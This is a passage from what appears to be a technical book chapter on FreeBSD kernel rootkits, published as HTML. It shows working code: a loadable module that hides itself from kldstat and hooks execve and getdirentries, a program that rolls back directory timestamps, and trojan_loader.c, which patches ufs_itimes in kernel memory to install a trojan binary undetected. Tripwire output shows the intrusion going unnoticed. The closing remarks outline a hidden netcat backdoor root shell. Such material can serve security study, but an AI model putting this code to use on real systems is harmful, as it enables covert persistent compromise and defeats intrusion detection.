                        TAILQ_REMOVE(&amp;linker_files, lf, link);
                        break;
                }
        }

        mtx_unlock(&amp;kld_mtx);
        mtx_unlock(&amp;Giant);

        sx_xlock(&amp;modules_sx);

        /*
         * Iterate through the modules list, looking for "incognito."
         * If found, decrement nextid and remove from list.
         */
        TAILQ_FOREACH(mod, &amp;modules, link) {
                if (strcmp(mod-&gt;name, "incognito") == 0) {
                        nextid--;
                        TAILQ_REMOVE(&amp;modules, mod, link);
                        break;
                }
        }

        sx_xunlock(&amp;modules_sx);

        sysent[SYS_execve].sy_call = (sy_call_t *)execve_hook;
		sysent[SYS_getdirentries].sy_call = (sy_call_t *)getdirentries_hook;

        return(0);
}

static moduledata_t incognito_mod = {
        "incognito",            /* module name */
        load,                   /* event handler */
        NULL                    /* extra data */
};

DECLARE_MODULE(incognito, incognito_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
</pre><p><span class="emphasis"><em>Listing 6-5: incognito-0.3.c</em></span></p><p>Now, loading the above KLD gives us:</p><a id="I_programlisting6_d1e7127"/><pre class="programlisting">
$ <strong class="userinput"><code>kldstat</code></strong>
Id Refs Address    Size     Name
 1    3 0xc0400000 63070c   kernel
 2   16 0xc0a31000 568dc    acpi.ko
$ <strong class="userinput"><code>sudo kldload ./incognito-0.3.ko</code></strong>
$ <strong class="userinput"><code>hello</code></strong>
May the schwartz be with you!
$ <strong class="userinput"><code>ls /sbin/t*</code></strong>
/sbin/tunefs
$ <strong class="userinput"><code>kldstat</code></strong>
Id Refs Address    Size     Name
 1    3 0xc0400000 63070c   kernel
 2   16 0xc0a31000 568dc    acpi.ko
</pre><p>Note how the output of <code class="literal">kldstat(8)</code> is the same before and after installing the rootkit—groovy!</p><p>At this point, you can redirect the execution of <code class="literal">hello</code> into <code class="literal">trojan_hello</code> while hiding both <code class="literal">trojan_hello</code> and the rootkit itself from the system (which, subsequently, makes it unloadable). There is just one more problem. When you install <code class="literal">trojan_hello</code> into /sbin/, the directory's access, modification, and change times update—a dead giveaway that something is amiss.</p></div></div>
<div class="sect1" xml:lang="en"><div class="titlepage"><div><div><h1 class="title"><a id="preventing_access_comma_modification_comma_and_change_time_updates"/>Preventing Access, Modification, and Change Time Updates</h1></div></div></div><p>Because the access and modification times on a file can be set, you can "prevent" them from updating by just rolling them back. Listing 6-6 demonstrates how:<a id="IDX-CHP-6-0359" class="indexterm"/><a id="IDX-CHP-6-0360" class="indexterm"/><a id="IDX-CHP-6-0361" class="indexterm"/><a id="IDX-CHP-6-0362" class="indexterm"/></p><a id="I_programlisting6_d1e7182"/><pre class="programlisting">
#include &lt;errno.h&gt;
#include &lt;stdio.h&gt;
#include &lt;sys/time.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/stat.h&gt;

int
main(int argc, char *argv[])
{
struct stat sb;
struct timeval time[2];

	   ❶if (stat("/sbin", &amp;sb) &lt; 0) {
                     fprintf(stderr, "STAT ERROR: %d\n", errno);
                     exit(-1);

	   }

	   ❷time[0].tv_sec = sb.st_atime;
	   time[1].tv_sec = sb.st_mtime;

	   /*
	    * Do something to /sbin/.
	    */

        ❸if (utimes("/sbin", (struct timeval *)&amp;time) &lt; 0) {
					  fprintf(stderr, "UTIMES ERROR: %d\n", errno);
					  exit(-1);
		}

		exit(0);
}
</pre><p><span class="emphasis"><em>listing 6-6: rollback.c</em></span></p><p>The preceding code first ❶ calls the function <code class="literal">stat</code> to obtain the /sbin/ directory's filesystem information. This information is placed into the variable <code class="literal">sb</code>, a <code class="literal">stat</code> structure defined by the <code class="literal">&lt;sys/stat.h&gt;</code> header. The fields of <code class="literal">struct stat</code> relevant to our discussion are as follows:</p><a id="I_programlisting6_d1e7204"/><pre class="programlisting">
time_t    st_atime;           /* time of last access */
time_t    st_mtime;			  /* time of last data modification */
</pre><p>Next, ❷ /sbin/'s access and modification times are stored within <code class="literal">time[]</code>, an array of two <code class="literal">timeval</code> structures, defined in the <code class="literal">&lt;sys/_timeval.h&gt;</code> header as follows:</p><a id="I_programlisting6_d1e7217"/><pre class="programlisting">
struct timeval {
        long          tv_sec;      /* seconds */
        suseconds_t   tv_usec;     /* and microseconds */
};
</pre><p>Finally, ❸ the function <code class="literal">utimes</code> is called to set (or roll back) /sbin/'s access and modification times, effectively "preventing" them from updating.</p><div class="sect2" xml:lang="en"><div class="titlepage"><div><div><h2 class="title"><a id="change_time"/>Change Time</h2></div></div></div><p>Unfortunately, the change time cannot be set or rolled back, because that would go against its intended purpose, which is to record all file status changes, including "corrections" to the access or modification times. The function responsible for updating an inode's change time (along with its access and modification times) is <code class="literal">ufs_itimes</code>, which is implemented in the file /sys/ufs/ufs/ufs_vnops.c as follows:<a id="IDX-CHP-6-0363" class="indexterm"/><a id="IDX-CHP-6-0364" class="indexterm"/><a id="IDX-CHP-6-0365" class="indexterm"/><a id="IDX-CHP-6-0366" class="indexterm"/><a id="IDX-CHP-6-0367" class="indexterm"/></p><a id="I_programlisting6_d1e7253"/><pre class="programlisting">
void
ufs_itimes(vp)
		struct vnode *vp;
{
		struct inode *ip;
		struct timespec ts;

		ip = VTOI(vp);
		if ((ip-&gt;i_flag &amp;(IN_ACCESS | IN_CHANGE | IN_UPDATE)) == 0)
			    return;
		if ((vp-&gt;v_type == VBLK || vp-&gt;v_type == VCHR) &amp;&amp; !DOINGSOFTDEP(vp))
				ip-&gt;i_flag |= IN_LAZYMOD;
		else
				ip-&gt;i_flag |= IN_MODIFIED;
		if ((vp-&gt;v_mount-&gt;mnt_flag &amp; MNT_RDONLY) == 0) {
				vfs_timestamp(&amp;ts);
				if (ip-&gt;i_flag &amp;IN_ACCESS) {
				DIP_SET(ip, i_atime, ts.tv_sec);
				DIP_SET(ip, i_atimensec, ts.tv_nsec);
}
		if (ip-&gt;i_flag &amp;IN_UPDATE) {
				DIP_SET(ip, i_mtime, ts.tv_sec);
				DIP_SET(ip, i_mtimensec, ts.tv_nsec);
				ip-&gt;i_modrev++;
		}
		if (ip-&gt;i_flag &amp;IN_CHANGE) {
		<strong class="userinput"><code>DIP_SET(ip, i_ctime, ts.tv_sec);
        DIP_SET(ip, i_ctimensec, ts.tv_nsec);</code></strong>
		}
	}
	ip-&gt;i_flag &amp;= ~(IN_ACCESS | IN_CHANGE | IN_UPDATE);
}
</pre><p>If you <code class="literal">nop</code> out the lines shown in bold, you can effectively prevent all updates to an inode's change time.</p><p>That being said, you need to know what these lines (i.e., the <code class="literal">DIP_SET</code> macro) look like once they're loaded in main memory.</p><a id="I_programlisting6_d1e7268"/><pre class="programlisting">
<strong class="userinput"><code>$ nm /boot/kernel/kernel | grep ufs_itimes</code></strong>
c06c0e60 T ufs_itimes
<strong class="userinput"><code>$ objdump -d --start-address=0xc06c0e60 /boot/kernel/kernel</code></strong>

/boot/kernel/kernel: file format elf32-i386-freebsd

Disassembly of section .text:

c06c0e60 &lt;ufs_itimes&gt;:
c06c0e60:       55                      push   %ebp
c06c0e61:       89 e5                   mov    %esp,%ebp
c06c0e63:       83 ec 14                sub    $0x14,%esp
c06c0e66:       89 5d f8                mov    %ebx,0xfffffff8(%ebp)
c06c0e69:       8b 4d 08                mov    0x8(%ebp),%ecx
c06c0e6c:       89 75 fc                mov    %esi,0xfffffffc(%ebp)
c06c0e6f:       8b 59 0c                mov    0xc(%ecx),%ebx
c06c0e72:       8b 53 10                mov    0x10(%ebx),%edx
c06c0e75:       f6 c2 07                test   $0x7,%dl
c06c0e78:       74 1f                   je     c06c0e99 &lt;ufs_itimes+0x39&gt;
c06c0e7a:       8b 01                   mov    (%ecx),%eax
c06c0e7c:       83 e8 03                sub    $0x3,%eax
c06c0e7f:       83 f8 01                cmp    $0x1,%eax
c06c0e82:       76 1f                   jbe    c06c0ea3 &lt;ufs_itimes+0x43&gt;
c06c0e84:       83 ca 08                or     $0x8,%edx
c06c0e87:       89 53 10                mov    %edx,0x10(%ebx)
c06c0e8a:       8b 41 10                mov    0x10(%ecx),%eax
c06c0e8d:       f6 40 6c 01             testb  $0x1,0x6c(%eax)
c06c0e91:       74 2d                   je     c06c0ec0 &lt;ufs_itimes+0x60&gt;
c06c0e93:       83 e2 f8                and    $0xfffffff8,%edx
c06c0e96:       89 53 10                mov    %edx,0x10(%ebx)
c06c0e99:       8b 5d f8                mov    0xfffffff8(%ebp),%ebx
c06c0e9c:       8b 75 fc                mov    0xfffffffc(%ebp),%esi
c06c0e9f:       89 ec                   mov    %ebp,%esp
c06c0ea1:       5d                      pop    %ebp
c06c0ea2:       c3                      ret
c06c0ea3:       8b 41 10                mov    0x10(%ecx),%eax
c06c0ea6:       f6 40 6e 20             testb  $0x20,0x6e(%eax)
c06c0eaa:       75 d8                   jne    c06c0e84 &lt;ufs_itimes+0x24&gt;
c06c0eac:       83 ca 40                or     $0x40,%edx
c06c0eaf:       89 53 10                mov    %edx,0x10(%ebx)
c06c0eb2:       8b 41 10                mov    0x10(%ecx),%eax
c06c0eb5:       f6 40 6c 01             testb  $0x1,0x6c(%eax)
c06c0eb9:       75 d8                   jne    c06c0e93 &lt;ufs_itimes+0x33&gt;
c06c0ebb:       90                      nop
c06c0ebc:       8d 74 26 00             lea    0x0(%esi),%esi
c06c0ec0:       8d 75 f0                lea    0xfffffff0(%ebp),%esi
c06c0ec3:       89 34 24                mov    %esi,(%esp)
c06c0ec6:       e8 f5 08 ef ff          call   c05b17c0 &lt;vfs_timestamp&gt;
c06c0ecb:       8b 53 10                mov    0x10(%ebx),%edx
c06c0ece:       f6 c2 01                test   $0x1,%dl
c06c0ed1:       74 3d                   je     c06c0f10 &lt;ufs_itimes+0xb0&gt;
c06c0ed3:       8b 43 0c                mov    0xc(%ebx),%eax
c06c0ed6:       83 78 14 01             cmpl   $0x1,0x14(%eax)
c06c0eda:       0f 84 bd 00 00 00       je     c06c0f9d &lt;ufs_itimes+0x13d&gt;
c06c0ee0:       8b 45 f0                mov    0xfffffff0(%ebp),%eax
c06c0ee3:       8b 93 80 00 00 00       mov    0x80(%ebx),%edx
c06c0ee9:       89 c1                   mov    %eax,%ecx
<strong class="userinput"><code>c06c0eeb:       89 42 20                mov    %eax,0x20(%edx)</code></strong>
c06c0eee:       c1 f9 1f                sar    $0x1f,%ecx
<strong class="userinput"><code>c06c0ef1:       89 4a 24                mov    %ecx,0x24(%edx)</code></strong>
c06c0ef4:       8b 43 0c                mov    0xc(%ebx),%eax
c06c0ef7:       83 78 14 01             cmpl   $0x1,0x14(%eax)
c06c0efb:       0f 84 f1 00 00 00       je     c06c0ff2 &lt;ufs_itimes+0x192&gt;
c06c0f01:       8b 93 80 00 00 00       mov    0x80(%ebx),%edx
c06c0f07:       8b 46 04                mov    0x4(%esi),%eax
c06c0f0a:       89 42 44                mov    %eax,0x44(%edx)
c06c0f0d:       8b 53 10                mov    0x10(%ebx),%edx
c06c0f10:       f6 c2 04                test   $0x4,%dl
c06c0f13:       74 45                   je     c06c0f5a &lt;ufs_itimes+0xfa&gt;
c06c0f15:       8b 43 0c                mov    0xc(%ebx),%eax
c06c0f18:       83 78 14 01             cmpl   $0x1,0x14(%eax)
c06c0f1c:       0f 84 bf 00 00 00       je     c06c0fe1 &lt;ufs_itimes+0x181&gt;
c06c0f22:       8b 45 f0                mov    0xfffffff0(%ebp),%eax
c06c0f25:       8b 93 80 00 00 00       mov    0x80(%ebx),%edx
c06c0f2b:       89 c1                   mov    %eax,%ecx
<strong class="userinput"><code>c06c0f2d:       89 42 28                mov    %eax,0x28(%edx)</code></strong>
c06c0f30:       c1 f9 1f                sar    $0x1f,%ecx
<strong class="userinput"><code>c06c0f33:       89 4a 2c                mov    %ecx,0x2c(%edx)</code></strong>
c06c0f36:       8b 43 0c                mov    0xc(%ebx),%eax
c06c0f39:       83 78 14 01             cmpl   $0x1,0x14(%eax)
c06c0f3d:       0f 84 8d 00 00 00       je     c06c0fd0 &lt;ufs_itimes+0x170&gt;
c06c0f43:       8b 93 80 00 00 00       mov    0x80(%ebx),%edx
c06c0f49:       8b 46 04                mov    0x4(%esi),%eax
c06c0f4c:       89 42 40                mov    %eax,0x40(%edx)
c06c0f4f:       83 43 2c 01             addl   $0x1,0x2c(%ebx)
c06c0f53:       8b 53 10                mov    0x10(%ebx),%edx
c06c0f56:       83 53 30 00             adcl   $0x0,0x30(%ebx)
c06c0f5a:       f6 c2 02                test   $0x2,%dl
c06c0f5d:       0f 84 30 ff ff ff       je     c06c0e93 &lt;ufs_itimes+0x33&gt;
c06c0f63:       8b 43 0c                mov    0xc(%ebx),%eax
c06c0f66:       83 78 14 01             cmpl   $0x1,0x14(%eax)
c06c0f6a:       74 56                   je     c06c0fc2 &lt;ufs_itimes+0x162&gt;
c06c0f6c:       8b 45 f0                mov    0xfffffff0(%ebp),%eax
c06c0f6f:       8b 93 80 00 00 00       mov    0x80(%ebx),%edx
c06c0f75:       89 c1                   mov    %eax,%ecx
<strong class="userinput"><code>c06c0f77:       89 42 30                mov    %eax,0x30(%edx)</code></strong>
c06c0f7a:       c1 f9 1f                sar    $0x1f,%ecx
<strong class="userinput"><code>c06c0f7d:       89 4a 34                mov    %ecx,0x34(%edx)</code></strong>
c06c0f80:       8b 43 0c                mov    0xc(%ebx),%eax
c06c0f83:       83 78 14 01             cmpl   $0x1,0x14(%eax)
c06c0f87:       74 25                   je     c06c0fae &lt;ufs_itimes+0x14e&gt;
c06c0f89:       8b 93 80 00 00 00       mov    0x80(%ebx),%edx
c06c0f8f:       8b 46 04                mov    0x4(%esi),%eax
c06c0f92:       89 42 48                mov    %eax,0x48(%edx)
c06c0f95:       8b 53 10                mov    0x10(%ebx),%edx
c06c0f98:       e9 f6 fe ff ff          jmp    c06c0e93 &lt;ufs_itimes+0x33&gt;
c06c0f9d:       8b 93 80 00 00 00       mov    0x80(%ebx),%edx
c06c0fa3:       8b 45 f0                mov    0xfffffff0(%ebp),%eax
c06c0fa6:       89 42 10                mov    %eax,0x10(%edx)
c06c0fa9:       e9 46 ff ff ff          jmp    c06c0ef4 &lt;ufs_itimes+0x94&gt;
c06c0fae:       8b 93 80 00 00 00       mov    0x80(%ebx),%edx
c06c0fb4:       8b 46 04                mov    0x4(%esi),%eax
c06c0fb7:       89 42 24                mov    %eax,0x24(%edx)
c06c0fba:       8b 53 10                mov    0x10(%ebx),%edx
c06c0fbd:       e9 d1 fe ff ff          jmp    c06c0e93 &lt;ufs_itimes+0x33&gt;
c06c0fc2:       8b 93 80 00 00 00       mov    0x80(%ebx),%edx
c06c0fc8:       8b 45 f0                mov    0xfffffff0(%ebp),%eax
c06c0fcb:       89 42 20                mov    %eax,0x20(%edx)
c06c0fce:       eb b0                   jmp    c06c0f80 &lt;ufs_itimes+0x120&gt;
c06c0fd0:       8b 93 80 00 00 00       mov    0x80(%ebx),%edx
c06c0fd6:       8b 46 04                mov    0x4(%esi),%eax
c06c0fd9:       89 42 1c                mov    %eax,0x1c(%edx)
c06c0fdc:       e9 6e ff ff ff          jmp    c06c0f4f &lt;ufs_itimes+0xef&gt;
c06c0fe1:       8b 93 80 00 00 00       mov    0x80(%ebx),%edx
c06c0fe7:       8b 45 f0                mov    0xfffffff0(%ebp),%eax
c06c0fea:       89 42 18                mov    %eax,0x18(%edx)
c06c0fed:       e9 44 ff ff ff          jmp    c06c0f36 &lt;ufs_itimes+0xd6&gt;
c06c0ff2:       8b 93 80 00 00 00       mov    0x80(%ebx),%edx
c06c0ff8:       8b 46 04                mov    0x4(%esi),%eax
c06c0ffb:       89 42 14                mov    %eax,0x14(%edx)
c06c0ffe:       e9 0a ff ff ff          jmp    c06c0f0d &lt;ufs_itimes+0xad&gt;
c06c1003:       8d b6 00 00 00 00       lea    0x0(%esi),%esi
c06c1009:       8d bc 27 00 00 00 00    lea    0x0(%edi),%edi
</pre><p>In this output, the six lines shown in bold (within the disassembly dump) each represent a call to <code class="literal">DIP_SET</code>, with the last two lines corresponding to the ones you want to <code class="literal">nop</code> out. The following narrative details how I came to this conclusion.</p><p>First, within the function <code class="literal">ufs_itimes</code>, the macro <code class="literal">DIP_SET</code> is called six times, in three sets of two. Therefore, within the disassembly, there should be three sets of instructions that are somewhat similar. Next, the <code class="literal">DIP_SET</code> calls all occur after the function <code class="literal">vfs_timestamp</code> is called. Therefore, any code occurring before the call to <code class="literal">vfs_timestamp</code> can be ignored. Finally, because the macro <code class="literal">DIP_SET</code> alters a passed parameter, its disassembly (most likely) involves the general purpose data registers. Given these criteria, the two <code class="literal">mov</code> instructions surrounding each <code class="literal">sar</code> instruction are the only ones that match.</p></div><div class="sect2" xml:lang="en"><div class="titlepage"><div><div><h2 class="title"><a id="example-id10"/>Example</h2></div></div></div><p>Listing 6-7 installs <code class="literal">trojan_hello</code> into the directory /sbin/ without updating its access, modification, or change times. The program first saves the access and modification times of /sbin/. Then the function <code class="literal">ufs_itimes</code> is patched to prevent updating change times. Next, the binary <code class="literal">trojan_hello</code> is copied into /sbin/, and /sbin/'s access and modification times are rolled back. Finally, the function <code class="literal">ufs_itimes</code> is restored.<a id="IDX-CHP-6-0368" class="indexterm"/></p><a id="I_programlisting6_d1e7354"/><pre class="programlisting">
#include &lt;errno.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;kvm.h&gt;
#include &lt;limits.h&gt;
#include &lt;nlist.h&gt;
#include &lt;stdio.h&gt;
#include &lt;sys/time.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/stat.h&gt;

#define SIZE            450
#define T_NAME          "trojan_hello"
#define DESTINATION     "/sbin/."

/* Replacement code. */
unsigned char nop_code[] =
        "\x90\x90\x90";         /* nop          */

int
main(int argc, char *argv[])
{
        int i, offset1, offset2;
        char errbuf[_POSIX2_LINE_MAX];
        kvm_t *kd;
        struct nlist nl[] = { {NULL}, {NULL}, };
        unsigned char ufs_itimes_code[SIZE];

        struct stat sb;
        struct timeval time[2];

        /* Initialize kernel virtual memory access. */
        kd = kvm_openfiles(NULL, NULL, NULL, O_RDWR, errbuf);
        if (kd == NULL) {
                fprintf(stderr, "ERROR:      %s\n", errbuf);
                exit(-1);
        }

        nl[0].n_name = "ufs_itimes";

        if (kvm_nlist(kd, nl) &lt; 0) {
                fprintf(stderr, "ERROR: %s\n", kvm_geterr(kd));
                exit(-1);
        }

        if (!nl[0].n_value) {
                fprintf(stderr, "ERROR: Symbol %s not found\n",
                    nl[0].n_name);
                exit(-1);
        }

        /* Save a copy of ufs_itimes. */
        if (kvm_read(kd, nl[0].n_value, ufs_itimes_code, SIZE) &lt; 0) {
                fprintf(stderr, "ERROR: %s\n", kvm_geterr(kd));
                exit(-1);
        }

        /*
         * Search through ufs_itimes for the following two lines:
         *         DIP_SET(ip, i_ctime, ts.tv_sec);
         *         DIP_SET(ip, i_ctimensec, ts.tv_nsec);
         */
        for (i = 0; i &lt; SIZE - 2; i++) {
                if (ufs_itimes_code[i] == 0x89 &amp;&amp;
                    ufs_itimes_code[i+1] == 0x42 &amp;&amp;
                    ufs_itimes_code[i+2] == 0x30)
                        offset1 = i;

                if (ufs_itimes_code[i] == 0x89 &amp;&amp;
                    ufs_itimes_code[i+1] == 0x4a &amp;&amp;
                    ufs_itimes_code[i+2] == 0x34)
                        offset2 = i;
        }

        /* Save /sbin/'s access and modification times. */
        if (stat("/sbin", &amp;sb) &lt; 0) {
                fprintf(stderr, "STAT ERROR: %d\n", errno);
                exit(-1);
        }

        time[0].tv_sec = sb.st_atime;
        time[1].tv_sec = sb.st_mtime;

        /* Patch ufs_itimes. */
        if (kvm_write(kd, nl[0].n_value + offset1, nop_code,
            sizeof(nop_code) - 1) &lt; 0) {
                fprintf(stderr, "ERROR: %s\n", kvm_geterr(kd));
                exit(-1);
        }

        if (kvm_write(kd, nl[0].n_value + offset2, nop_code,
            sizeof(nop_code) - 1) &lt; 0) {
                fprintf(stderr, "ERROR: %s\n", kvm_geterr(kd));
                exit(-1);
        }
        /* Copy T_NAME into DESTINATION. */
        char string[] = "cp" " " T_NAME " " DESTINATION;
        system(&amp;string);

        /* Roll back /sbin/'s access and modification times. */
        if (utimes("/sbin", (struct timeval *)&amp;time) &lt; 0) {
                fprintf(stderr, "UTIMES ERROR: %d\n", errno);
                exit(-1);
        }

        /* Restore ufs_itimes. */
        if (kvm_write(kd, nl[0].n_value + offset1, &amp;ufs_itimes_code[offset1],
            sizeof(nop_code) - 1) &lt; 0) {
                fprintf(stderr, "ERROR: %s\n", kvm_geterr(kd));
                exit(-1);
        }

        if (kvm_write(kd, nl[0].n_value + offset2, &amp;ufs_itimes_code[offset2],
            sizeof(nop_code) - 1) &lt; 0) {
                fprintf(stderr, "ERROR: %s\n", kvm_geterr(kd));
                exit(-1);
        }

        /* Close kd. */
        if (kvm_close(kd) &lt; 0) {
                fprintf(stderr, "ERROR: %s\n", kvm_geterr(kd));
                exit(-1);
        }

        /* Print out a debug message, indicating our success. */
        printf("Y'all just mad. Because today, you suckers got served.\n");

        exit(0);
}
</pre><p><span class="emphasis"><em>trojan_loader.c</em></span></p><div class="note" style="margin-left: 0.5in; margin-right: 0.5in;"><h3 class="title">Note</h3><p>We could have patched <em class="replaceable"><code>ufs_itimes</code></em> (in four additional spots) to prevent the access, modification, and change times from updating on <span class="emphasis"><em>all</em></span> files. However, we want to be as subtle as possible; hence, we rolled back the access and modification times instead.</p></div></div></div>
<div class="sect1" xml:lang="en"><div class="titlepage"><div><div><h1 class="title"><a id="proof_of_concept_colon_faking_out_tripwire"/>Proof of Concept: Faking Out Tripwire</h1></div></div></div><p>In the following output, I run the rootkit developed in this chapter against Tripwire, which is arguably the most common and well-known HIDS.<a id="IDX-CHP-6-0369" class="indexterm"/><a id="IDX-CHP-6-0370" class="indexterm"/><a id="IDX-CHP-6-0371" class="indexterm"/></p><p>First, I execute the command <code class="literal">tripwire --check</code> to validate the integrity of the filesystem. Next, the rootkit is installed to trojan the binary <code class="literal">hello</code> (which is located within /sbin/). Finally, I execute <code class="literal">tripwire --check</code> again to audit the filesystem and see if the rootkit is detected.</p><div class="note" style="margin-left: 0.5in; margin-right: 0.5in;"><h3 class="title">Note</h3><p>Because the average Tripwire report is rather detailed and lengthy, I have omitted any extraneous or redundant information from the following output to save space.</p></div><a id="I_programlisting6_d1e7402"/><pre class="programlisting">
$ <strong class="userinput"><code>sudo tripwire --check</code></strong>
Parsing policy file: /usr/local/etc/tripwire/tw.pol
*** Processing Unix File System ***
Performing integrity check...
Wrote report file: /var/db/tripwire/report/slavetwo-20070305-072935.twr


Tripwire(R) 2.3.0 Integrity Check Report

Report generated by:          root
Report created on:            Mon Mar 5 07:29:35 2007
Database last updated on:     Mon Mar 5 07:28:11 2007
. . .

Total objects scanned:  69628
Total violations found:  0

=============================================================================
Object Summary:
=============================================================================

-----------------------------------------------------------------------------
# Section: Unix File System
-----------------------------------------------------------------------------

No violations.

=============================================================================
Error Report:
=============================================================================

No Errors
-----------------------------------------------------------------------------
*** End of report ***

Tripwire 2.3 Portions copyright 2000 Tripwire, Inc. Tripwire is a registered
trademark of Tripwire, Inc. This software comes with ABSOLUTELY NO WARRANTY;
for details use --version. This is free software which may be redistributed
or modified only under certain conditions; see COPYING for details.
All rights reserved.
Integrity check complete.
$ <strong class="userinput"><code>hello</code></strong>
May the force be with you.
$ <strong class="userinput"><code>sudo ./trojan_loader</code></strong>
Y'all just mad. Because today, you suckers got served.
$ <strong class="userinput"><code>sudo kldload ./incognito-0.3.ko</code></strong>
$ <strong class="userinput"><code>kldstat</code></strong>
Id Refs Address    Size     Name
 1    3 0xc0400000 63070c   kernel
 2   16 0xc0a31000 568dc    acpi.ko
$ <strong class="userinput"><code>ls /sbin/t*</code></strong>
/sbin/tunefs
$ <strong class="userinput"><code>hello</code></strong>
May the schwartz be with you!
$ <strong class="userinput"><code>sudo tripwire --check</code></strong>
Parsing policy file: /usr/local/etc/tripwire/tw.pol
*** Processing Unix File System ***
Performing integrity check...
Wrote report file: /var/db/tripwire/report/slavetwo-20070305-074918.twr


Tripwire(R) 2.3.0 Integrity Check Report

Report generated by:          root
Report created on:            Mon Mar 5 07:49:18 2007
Database last updated on:     Mon Mar 5 07:28:11 2007
. . .

Total objects scanned:  69628
Total violations found:  0

=============================================================================
Object Summary:
=============================================================================

-----------------------------------------------------------------------------
# Section: Unix File System
-----------------------------------------------------------------------------

No violations.

=============================================================================
Error Report:
=============================================================================

No Errors

-----------------------------------------------------------------------------
*** End of report ***

Tripwire 2.3 Portions copyright 2000 Tripwire, Inc. Tripwire is a registered
trademark of Tripwire, Inc. This software comes with ABSOLUTELY NO WARRANTY;
for details use --version. This is free software which may be redistributed
or modified only under certain conditions; see COPYING for details.
All rights reserved.
Integrity check complete.
</pre><p>Wonderful—Tripwire reports no violations.</p><p>Of course, there is still more you can do to improve this rootkit. For example, you could cloak the system call hooks (as discussed in <a class="xref" href="ch05s07.html" title="Cloaking System Call Hooks">Cloaking System Call Hooks</a>).</p><div class="note" style="margin-left: 0.5in; margin-right: 0.5in;"><h3 class="title">Note</h3><p>An offline analysis would have detected the Trojan; after all, you can't hide within the system if the system isn't running!</p></div></div>
<div class="sect1" xml:lang="en"><div class="titlepage"><div><div><h1 class="title"><a id="concluding_remarks-id6"/>Concluding Remarks</h1></div></div></div><p>The purpose of this chapter (believe it or not) wasn't to badmouth HIDSes, but rather to demonstrate what you can achieve by combining the techniques described throughout this book. Just for fun, here is another example.<a id="IDX-CHP-6-0372" class="indexterm"/><a id="IDX-CHP-6-0373" class="indexterm"/></p><p>Combine the <code class="literal">icmp_input_hook</code> code from <a class="xref" href="ch02.html" title="Chapter 2. HOOKING">Chapter 2</a> with portions of the <code class="literal">execve_hook</code> code from this chapter to create a "network trigger" capable of executing a user space process, such as <code class="literal">netcat</code>, to spawn a backdoor root shell. Then, combine that with the <code class="literal">process_hiding</code> and <code class="literal">port_hiding</code> code from <a class="xref" href="ch03.html" title="Chapter 3. DIRECT KERNEL OBJECT MANIPULATION">Chapter 3</a> to hide the root shell and connection. Include the module hiding routine from this chapter to hide the rootkit itself. And just to be safe, throw in the <code class="literal">getdirentries_hook</code> code for <code class="literal">netcat</code>.</p><p>Of course, this rootkit can also be improved upon. For example, because a lot of admins set their firewalls/packet filters to drop incoming ICMP packets, consider hooking a different <em class="replaceable"><code>*_input</code></em> function, such as <em class="replaceable"><code>tcp_input</code></em>.</p></div></body></html>